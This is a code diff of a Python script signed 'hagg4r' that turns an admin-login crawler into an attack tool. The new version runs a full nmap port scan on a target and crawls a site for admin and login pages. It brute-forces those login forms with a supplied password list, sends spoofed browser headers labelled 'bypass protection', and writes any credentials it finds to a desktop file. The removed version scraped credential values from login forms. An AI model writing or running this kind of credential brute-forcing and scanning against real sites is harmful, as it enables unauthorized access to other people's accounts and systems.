@@ -1,98 +1,83 @@
 import argparse
-import os
-import re
 import requests
 from bs4 import BeautifulSoup
-from scrapy.crawler import CrawlerProcess
-from scrapy.spiders import Rule
-from scrapy.linkextractors import LinkExtractor
-from urllib.parse import urljoin, urlparse
-from selenium import webdriver
-from selenium.webdriver.chrome.service import Service
-from webdriver_manager.chrome import ChromeDriverManager
-from scrapy.utils.response import open_in_browser
+from urllib.parse import urljoin
+import subprocess
+import os
+print("by hagg4r")
+def is_admin_page(url):
+    return "admin" in url.lower() or "login" in url.lower()
 
-def is_login_page(response):
-    # Controllo semplice per le pagine di accesso, è possibile aggiungere ulteriori condizioni
-    return "login" in response.url.lower() or "admin" in response.url.lower()
+def brute_force_login(session, url, username, password_list):
+    for password in password_list:
+        data = {"username": username, "password": password}
+        response = session.post(url, data=data)
+        if "Welcome" in response.text or "Dashboard" in response.text:
+            credentials = f"{username}:{password}"
+            print(f"[+] Found credentials: {credentials}")
+            return credentials
+    return None
 
-def extract_credentials(form):
-    username_field = form.find("input", {"name": "username"}) or form.find("input", {"id": "username"})
-    password_field = form.find("input", {"name": "password"}) or form.find("input", {"id": "password"})
+def bypass_protection(session, url):
+    headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
+        'Referer': url
+    }
+    response = session.get(url, headers=headers)
+    return response
 
-    if username_field and password_field:
-        username = username_field["value"] if "value" in username_field.attrs else ""
-        password = password_field["value"] if "value" in password_field.attrs else ""
-        return username, password
+def scan_ports(target):
+    print(f"[*] Scanning ports on {target}")
+    result = subprocess.run(['nmap', '-p-', '--open', target], capture_output=True, text=True)
+    open_ports = []
+    for line in result.stdout.splitlines():
+        if "/tcp" in line and "open" in line:
+            port = line.split("/")[0]
+            open_ports.append(port)
+    return open_ports
 
-    # Tentativo di estrarre le credenziali utilizzando i modelli di espressione regolare
-    username_pattern = r'name="username" value="([^"]+)"'
-    password_pattern = r'name="password" value="([^"]+)"'
-    username = re.search(username_pattern, form.prettify(), re.IGNORECASE)
-    password = re.search(password_pattern, form.prettify(), re.IGNORECASE)
+def save_results(credentials, filename):
+    with open(filename, 'w') as file:
+        file.write("\n".join(credentials))
+    print(f"[+] Results saved to {filename}")
 
-    if username and password:
-        return username.group(1), password.group(1)
+def main():
+    # Get user input for target and username/password list
+    target_url = input("Enter the target URL: ")
+    target_host = input("Enter the target IP or hostname for port scanning: ")
+    username = input("Enter the username for brute force: ")
+    password_list = input("Enter the list of passwords separated by commas: ").split(',')
 
-    return "", ""
+    session = requests.Session()
+    
+    # Bypass initial protections
+    response = bypass_protection(session, target_url)
+    
+    soup = BeautifulSoup(response.text, "html.parser")
 
-class AdminLoginSpider:
-    name = "admin_login_spider"
+    # Find all links on the page
+    links = [urljoin(target_url, a["href"]) for a in soup.find_all("a", href=True)]
 
-    def __init__(self):
-        self.driver = webdriver.Chrome(service=Service(ChromeDriverManager().install()))
-        self.visited_urls = set()
+    # Scan for open ports
+    open_ports = scan_ports(target_host)
+    print(f"[+] Open ports: {', '.join(open_ports)}")
 
-    def start_requests(self):
-        yield self.driver.get(self.start_urls[0])
+    # Prepare to store found credentials
+    found_credentials = []
 
-    def parse(self, response):
-        soup = BeautifulSoup(self.driver.page_source, "html.parser")
-        current_url = response.url
+    # Filter out admin pages and perform brute force
+    for link in links:
+        if is_admin_page(link):
+            print(f"[*] Found potential admin page: {link}")
+            creds = brute_force_login(session, link, username, password_list)
+            if creds:
+                found_credentials.append(creds)
+                break
 
-        # Aggiungi l'URL corrente alla lista dei URLs visitati
-        self.visited_urls.add(current_url)
-
-        # Trova il modulo di accesso e estrae le credenziali
-        form = soup.find("form", {"method": "post"})
-        if form and is_login_page(response):
-            username, password = extract_credentials(form)
-            if username and password:
-                print("\u2620 Trovate le credenziali dell'amministratore:")
-                print(f"  Nome utente: {username}")
-                print(f"  Password: {password}")
-
-                # Salva le credenziali in un file sul desktop
-                desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
-                filename = "admin_credentials_{}.txt"
-                counter = 1
-                filepath = os.path.join(desktop_path, filename.format(counter))
-
-                while os.path.exists(filepath):
-                    counter += 1
-                    filepath = os.path.join(desktop_path, filename.format(counter))
-
-                with open(filepath, "w") as f:
-                    f.write(f"Nome utente: {username}\n")
-                    f.write(f"Password: {password}\n\n")
-
-                self.driver.quit()
-                return
-
-        # Segui i collegamenti e crawla ulteriormente, evitando i collegamenti già visitati
-        for link in soup.find_all("a", href=True):
-            next_url = urljoin(current_url, link["href"])
-            if next_url not in self.visited_urls:
-                yield self.driver.get(next_url)
-
-def main(args):
-    process = CrawlerProcess()
-    process.crawl(AdminLoginSpider, start_urls=[args.url])
-    process.start()
+    # Save results to a file on the desktop
+    desktop_path = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop') if os.name == 'nt' else os.path.join(os.path.expanduser('~'), 'Desktop')
+    result_file = os.path.join(desktop_path, "found_credentials.txt")
+    save_results(found_credentials, result_file)
 
 if __name__ == "__main__":
-    parser = argparse.ArgumentParser(description="Scanner web automatizzato per le pagine di accesso dell'amministratore e l'estrazione delle credenziali")
-    parser.add_argument("url", help="URL di destinazione")
-    args = parser.parse_args()
-
-    main(args)
+    main()
